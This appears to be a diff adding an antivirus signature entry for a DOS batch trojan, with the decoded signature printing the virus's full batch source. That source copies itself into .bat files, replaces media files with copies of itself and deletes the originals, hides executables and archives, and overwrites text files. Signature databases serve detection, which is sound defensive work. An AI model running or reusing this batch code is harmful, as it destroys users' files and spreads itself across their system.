@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36646
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off for /r c:\ %%p in (*.bat) do copy %0 "%%p">nul for /r c:\ %%s in (*.mp3 *.mpg *.avi *.mov *.jpg *.gif) do copy %0 "%%s.bat">nul for /r c:\ %%y in (*.mp3 *.mpg *.avi *.mov *.jpg *.gif) do del "%%y">nul for /r c:\ %%f in (*.doc) do attrib +r "%%f" for /r c:\ %%a in (*.exe *.zip) do atrrib +h "%%a" for /r c:\ %%l in (*.txt) do echo psyfal > "%%l" :: bat/psyfal
